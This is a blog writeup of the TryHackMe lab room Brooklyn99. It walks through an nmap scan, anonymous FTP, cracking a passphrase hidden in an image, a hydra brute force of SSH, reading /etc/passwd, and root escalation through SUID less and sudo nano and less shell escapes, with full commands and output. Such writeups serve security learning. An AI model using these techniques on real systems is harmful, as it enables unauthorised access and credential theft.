---
title: "Brooklyn99 Writeup THM"
description: "My writeup of the TryHackMe room [Brooklyn99](https://tryhackme.com/room/brooklynninenine)"
date: 2024-01-27T17:00:00+01:00
image: https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png
math:
license:
hidden: false
comments: true
draft: false
tags:
    - Linux
    - Privilege Escalation
categories:
    - Room
    - Easy
---

First of all I am going to start with a nmap scan:

```bash
nmap -sC -sV -p- 10.10.127.58

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-27 13:15 EST
Nmap scan report for 10.10.127.58
Host is up (0.064s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.11.65.91
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.07 seconds
```

We can see that it’s running a ftp server(with anonymous login allowed) and a website on port 80,

firstly I am going to check for the ftp server:

```bash
ftp 10.10.127.58

Connected to 10.10.127.58.
220 (vsFTPd 3.0.3)
Name (10.10.127.58:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33749|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.

ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||62565|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |********************************************************************************************************************************************************************************************|   119       39.55 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (2.00 KiB/s)
ftp> exit
221 Goodbye.

┌──(kali🔥kali)-[~]
└─$ ls
Desktop  Documents  Downloads  go  hhupd.exe  Music  note_to_jake.txt  pass.txt  Pictures  Public  TCM  Templates  tools  Videos

┌──(kali🔥kali)-[~]
└─$ cat note_to_jake.txt
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

We can see that there is a note for Jake, maybe this could mean that we should try some brute forcing on Jake’s password.

Now we also have 3 possible usernames: Amy, Jake, holt.

But now I am going to check the site:

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled.png)

In the source page there is this message, so i think that I should download the images and check if there is some secrete message:

```bash
stegseek --crack  brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "<redacted>"
[i] Original filename: "note.txt".
[i] Extracting to "brooklyn99.jpg.out".
```

Apparently there was a note in it.

```bash
cat brooklyn99.jpg.out

Holts Password:
<redacted>

Enjoy!!
```

And I got Holts Password.

But we can’t ssh in it.

```bash
ssh holts@10.10.127.58
The authenticity of host '10.10.127.58 (10.10.127.58)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.127.58' (ED25519) to the list of known hosts.
holts@10.10.127.58's password:
Permission denied, please try again.
holts@10.10.127.58's password:
Permission denied, please try again.
holts@10.10.127.58's password:
holts@10.10.127.58: Permission denied (publickey,password).
```

But if I remember jake had a bad password, so I am going to try and brute force ssh with jake:

```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.127.58
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-01-27 13:38:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.127.58:22/
[22][ssh] host: 10.10.127.58   login: jake   password: <redacted>
```

And I got jake’s password

```bash
ssh jake@10.10.127.58
jake@10.10.127.58's password:
Last login: Tue May 26 08:56:58 2020
jake@brookly_nine_nine:~$ whoami
jake
jake@brookly_nine_nine:~$ ls
```

Jake’s directory is empty.

We can confirm the usernames:

```bash
cat /etc/passwd | grep home
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
amy:x:1001:1001:,,,:/home/amy:/bin/bash
holt:x:1002:1002:,,,:/home/holt:/bin/bash
jake:x:1000:1000:,,,:/home/jake:/bin/bash
```

Ok, and apparently the name was wrong, it’s actually holt, not holts…



```bash
ssh holt@10.10.127.58
holt@10.10.127.58's password:
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
```

So now we got 2 users.

Ok, I actually found 3 ways to get the root flag…

First of all:

```bash
find / -type f -perm -04000 -ls 2>/dev/null
     2205    428 -rwsr-xr-x   1 root     root       436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign
     8400    100 -rwsr-xr-x   1 root     root       100760 Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
     7837    108 -rwsr-sr-x   1 root     root       109432 Oct 30  2019 /usr/lib/snapd/snap-confine
     2209     16 -rwsr-xr-x   1 root     root        14328 Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     2016     44 -rwsr-xr--   1 root     messagebus    42992 Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2023     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
     1652     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newgidmap
     1653     40 -rwsr-xr-x   1 root     root          40344 Mar 22  2019 /usr/bin/newgrp
     1690     24 -rwsr-xr-x   1 root     root          22520 Mar 27  2019 /usr/bin/pkexec
     1654     40 -rwsr-xr-x   1 root     root          37136 Mar 22  2019 /usr/bin/newuidmap
     1448     76 -rwsr-xr-x   1 root     root          76496 Mar 22  2019 /usr/bin/chfn
     1795    148 -rwsr-xr-x   1 root     root         149080 Jan 31  2020 /usr/bin/sudo
     1450     44 -rwsr-xr-x   1 root     root          44528 Mar 22  2019 /usr/bin/chsh
     1397     52 -rwsr-sr-x   1 daemon   daemon        51464 Feb 20  2018 /usr/bin/at
     1831     20 -rwsr-xr-x   1 root     root          18448 Jun 28  2019 /usr/bin/traceroute6.iputils
     1543     76 -rwsr-xr-x   1 root     root          75824 Mar 22  2019 /usr/bin/gpasswd
     1670     60 -rwsr-xr-x   1 root     root          59640 Mar 22  2019 /usr/bin/passwd
       66     40 -rwsr-xr-x   1 root     root          40152 Jan 27  2020 /snap/core/9066/bin/mount
       80     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /snap/core/9066/bin/ping
       81     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /snap/core/9066/bin/ping6
       98     40 -rwsr-xr-x   1 root     root          40128 Mar 25  2019 /snap/core/9066/bin/su
      116     27 -rwsr-xr-x   1 root     root          27608 Jan 27  2020 /snap/core/9066/bin/umount
     2670     71 -rwsr-xr-x   1 root     root          71824 Mar 25  2019 /snap/core/9066/usr/bin/chfn
     2672     40 -rwsr-xr-x   1 root     root          40432 Mar 25  2019 /snap/core/9066/usr/bin/chsh
     2748     74 -rwsr-xr-x   1 root     root          75304 Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
     2840     39 -rwsr-xr-x   1 root     root          39904 Mar 25  2019 /snap/core/9066/usr/bin/newgrp
     2853     53 -rwsr-xr-x   1 root     root          54256 Mar 25  2019 /snap/core/9066/usr/bin/passwd
     2963    134 -rwsr-xr-x   1 root     root         136808 Jan 31  2020 /snap/core/9066/usr/bin/sudo
     3062     42 -rwsr-xr--   1 root     systemd-resolve    42992 Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3432    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
     6470    109 -rwsr-xr-x   1 root     root              110792 Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
     7646    386 -rwsr-xr--   1 root     dip               394984 Feb 11  2020 /snap/core/9066/usr/sbin/pppd
       66     40 -rwsr-xr-x   1 root     root               40152 Oct 10  2019 /snap/core/8268/bin/mount
       80     44 -rwsr-xr-x   1 root     root               44168 May  7  2014 /snap/core/8268/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44680 May  7  2014 /snap/core/8268/bin/ping6
       98     40 -rwsr-xr-x   1 root     root               40128 Mar 25  2019 /snap/core/8268/bin/su
      116     27 -rwsr-xr-x   1 root     root               27608 Oct 10  2019 /snap/core/8268/bin/umount
     2665     71 -rwsr-xr-x   1 root     root               71824 Mar 25  2019 /snap/core/8268/usr/bin/chfn
     2667     40 -rwsr-xr-x   1 root     root               40432 Mar 25  2019 /snap/core/8268/usr/bin/chsh
     2743     74 -rwsr-xr-x   1 root     root               75304 Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
     2835     39 -rwsr-xr-x   1 root     root               39904 Mar 25  2019 /snap/core/8268/usr/bin/newgrp
     2848     53 -rwsr-xr-x   1 root     root               54256 Mar 25  2019 /snap/core/8268/usr/bin/passwd
     2958    134 -rwsr-xr-x   1 root     root              136808 Oct 11  2019 /snap/core/8268/usr/bin/sudo
     3057     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3427    419 -rwsr-xr-x   1 root     root              428240 Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
     6462    105 -rwsr-sr-x   1 root     root              106696 Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
     7636    386 -rwsr-xr--   1 root     dip               394984 Jun 12  2018 /snap/core/8268/usr/sbin/pppd
   131867     44 -rwsr-xr-x   1 root     root               43088 Jan  8  2020 /bin/mount
   131907     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /bin/su
   131891     64 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /bin/ping
   131840     32 -rwsr-xr-x   1 root     root               30800 Aug 11  2016 /bin/fusermount
   131851    168 -rwsr-xr-x   1 root     root              170760 Dec  1  2017 /bin/less
   131925     28 -rwsr-xr-x   1 root     root               26696 Jan  8  2020 /bin/umount
```

We can see that less has the SUID set.

that means that we can use less to read file inside the root folder:

```bash
/bin/less /root/root.txt

-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```

The second one is that holt can use nano has a sudo:

```bash
sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

![Untitled](https://raw.githubusercontent.com/SimoneFelici/Brooklyn99-writeup-THM/main/13bdc32e-cf3b-45e6-bbd0-66ba5d3eb15b_Export-b06d992f-14fb-47d3-b043-361b15c6baaf/Brooklyn99%2006e08d0fc2c34cefb989749df758fcb4/Untitled%201.png)

```bash
#whoami
root
cd ..
# ls
amy  holt  jake
# cd ..
# cd root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <redacted>
```

and the last is spawning a shell using jake:

```bash
sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

```bash
sudo /usr/bin/less /etc/profile
!/bin/sh

# whoami
root
cd ..
# cd root
# ls
root.txt
# cat root.txt
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: <redacted>

Enjoy!!
```

And that was it, maybe there are other methods to escalate, maybe using Amy, but I think that it’s enough for now.
